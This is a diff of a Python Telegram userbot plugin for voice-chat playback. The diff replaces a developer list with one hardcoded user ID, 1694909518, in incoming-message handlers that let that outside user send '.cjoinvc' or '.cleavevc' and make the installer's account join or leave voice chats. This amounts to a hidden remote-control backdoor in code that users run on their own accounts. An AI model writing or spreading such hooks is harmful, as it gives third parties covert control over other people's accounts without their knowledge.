@@ -22,7 +22,7 @@ from telethon.utils import get_display_name
 from youtubesearchpython import VideosSearch
 
 from userbot import CMD_HANDLER as cmd
-from userbot import CMD_HELP, owner, DEVS
+from userbot import CMD_HELP
 from userbot import PLAY_PIC as fotoplay
 from userbot import QUEUE_PIC as ngantri
 from userbot import call_py
@@ -461,7 +461,7 @@ async def vc_volume(event):
 
 
 @kar_cmd(pattern="joinvc(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cjoinvc(?: |$)(.*)")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cjoinvc(?: |$)(.*)")
 async def join_(event):
     xnxx = await edit_or_reply(event, f"**Processing..**")
     if len(event.text.split()) > 1:
@@ -489,7 +489,7 @@ async def join_(event):
 
 
 @kar_cmd(pattern="leavevc(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cleavevc(?: |$)(.*)")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cleavevc(?: |$)(.*)")
 async def leavevc(event):
     """ leave video chat """
     xnxx = await edit_or_reply(event, "Processing..")
